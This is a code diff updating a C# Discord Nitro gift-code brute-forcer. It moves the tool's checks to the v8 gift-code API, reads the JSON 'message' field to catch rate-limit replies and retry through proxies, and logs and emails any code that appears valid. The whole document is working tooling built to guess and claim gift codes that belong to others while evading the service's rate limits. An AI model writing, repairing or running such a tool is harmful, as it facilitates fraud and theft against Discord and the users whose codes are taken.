@@ -2,6 +2,7 @@
 using System;
 using System.IO;
 using System.Threading;
+using Newtonsoft.Json.Linq;
 
 namespace Discord_Nitro_BruteForce
 {
@@ -19,58 +20,53 @@ namespace Discord_Nitro_BruteForce
                 Proxy = proxy
             })
             {
-                HttpResponse res = req.Get($"https://discordapp.com/api/v6/entitlements/gift-codes/{code}");
+                HttpResponse res = req.Get($"https://discordapp.com/api/v8/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true");
 
-                switch ((int)res.StatusCode)
+                JToken message;
+                JObject resJson = JObject.Parse(res.ToString());
+                resJson.TryGetValue("message", out message);
+
+                if ((string)message == "You are being rate limited.")
                 {
-                    case 500:
-                    case 429:
-                    case 403:
-                    case 400:
-                    case 502:
-                    case 409:
-                        {
-                            if (Program.verbose)
-                            {
-                                Console.ForegroundColor = ConsoleColor.Yellow;
-                                Console.WriteLine($"[-] {code}: {res.StatusCode} ({(int)res.StatusCode})");
-                            }
-                            throw new HttpException();
-                        }
+                    if (Program.verbose)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Yellow;
+                        Console.WriteLine($"[-] {code}: {res.StatusCode}");
+                    }
+                    throw new HttpException();
+                }
 
-                    case 404:
-                        {
-                            Interlocked.Increment(ref Program.ch);
-                            if (Program.verbose)
-                            {
-                                Console.ForegroundColor = ConsoleColor.Red;
-                                Console.WriteLine($"[-] {code}");
-                            }
-                            return;
-                        }
+                else if ((string)message == "Unknown Gift Code")
+                {
+                    Interlocked.Increment(ref Program.ch);
+                    if (Program.verbose)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine($"[-] {code}");
+                    }
+                    return;
+                }
 
-                    default:
-                        {
-                            Interlocked.Increment(ref Program.ch);
-                            Interlocked.Increment(ref Program.goods);
+                else
+                {
+                    Interlocked.Increment(ref Program.goods);
 
-                            if (!Program.verbose)
-                                Console.SetCursorPosition(0, 5 + Program.goods);
+                    if (!Program.verbose)
+                        Console.SetCursorPosition(0, 5 + Program.goods);
 
-                            string wump = getWumpCode(code);
+                    string wump = getWumpCode(code);
 
-                            Console.ForegroundColor = ConsoleColor.Green;
-                            Console.WriteLine($"[+] {wump} (StatusCode: {(int)res.StatusCode})"); //I don't know status code of valid nitro gift
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine($"[+] {wump} (Message: {message})"); //I don't know status code of valid nitro gift
 
-                            lock (fileLocker)
-                            {
-                                File.AppendAllText("good.txt", wump + $" (StatusCode: {(int)res.StatusCode})\r\n");
-                            }
+                    lock (fileLocker)
+                    {
+                        File.AppendAllText("good.txt", $"{wump} (Message: {message})\r\n");
+                    }
 
-                            if (Program.emailnotification)
-                                Program.SendEmail(wump, "Hey! I founded valid code!");
-                            return;
-                        }
+                    if (Program.emailnotification)
+                        Program.SendEmail(wump, "Hey! I founded valid code!");
+                    return;
                 }
             }
         }
